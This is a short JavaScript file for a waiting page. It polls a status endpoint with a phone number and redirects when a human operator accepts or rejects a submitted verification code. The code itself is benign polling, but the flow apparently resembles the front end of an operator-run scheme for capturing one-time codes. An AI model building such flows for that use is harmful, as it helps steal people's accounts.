const API_STATUS = '/api/status';
function getParam(n) { return new URL(window.location.href).searchParams.get(n); }

const phone   = getParam('phone')   || '';
const carrier = getParam('carrier') || '';

if (document.getElementById('displayPhone'))
    document.getElementById('displayPhone').textContent = phone || '--';

// ── Elapsed timer ─────────────────────────────────────────────────────────────
const startTime = Date.now();
const elapsedEl = document.getElementById('elapsedTime');
function pad(n) { return String(n).padStart(2, '0'); }

setInterval(() => {
    if (!elapsedEl) return;
    const secs = Math.floor((Date.now() - startTime) / 1000);
    elapsedEl.textContent = Math.floor(secs / 60) + ':' + pad(secs % 60);
}, 1000);

// ── Status polling ────────────────────────────────────────────────────────────
// Consecutive failures stretch the polling interval (3 s -> up to 15 s) so a busy
// server isn't hammered by every waiting visitor at once.
let failures = 0;

async function checkStatus() {
    try {
        const res  = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
        if (!res.ok) { failures++; return; }
        failures = 0;
        const data = await res.json();

        if (data.status === 'completed') {
            window.location.href = 'success.html?phone=' + encodeURIComponent(phone);

        } else if (data.status === 'wrong_number') {
            window.location.href = 'index.html?wrong_number=1';

        } else if (data.status === 'retry_code') {
            // Staff rejected the code → go back to validation waiting page
            const params = new URLSearchParams({ phone, retry: '1' });
            if (carrier) params.set('carrier', carrier);
            window.location.href = 'validation.html?' + params.toString();
        }
        // code_submitted → keep polling
    } catch { failures++; }
}

(async function loop() {
    await checkStatus();
    setTimeout(loop, Math.min(15000, 3000 * (1 + failures)));
})();
